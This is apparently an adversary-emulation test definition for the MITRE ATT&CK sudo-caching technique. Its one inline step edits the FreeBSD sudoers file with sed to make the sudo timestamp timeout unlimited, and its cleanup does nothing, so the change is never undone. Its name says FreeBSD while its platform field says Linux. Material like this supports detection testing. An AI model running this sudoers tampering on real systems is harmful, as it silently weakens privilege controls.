api_version: "2.0"
name: Unlimited sudo cache timeout (freebsd)
description: |
    Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
uuid: a83ad6e8-6f24-4d7f-8f44-75f8ab742991
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1548: Abuse Elevation Control Mechanism'
    subtechniques:
        - 'T1548.003: Sudo and Sudo Caching'
requirements:
    platforms:
        - os: linux
steps:
    - name: unlimited-sudo-cache-timeout-(freebsd)
      inline: |
        sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers
        sudo visudo -c -f /usr/local/etc/sudoers
      executor: sh
      cleanup:
        inline: ""
        executor: sh
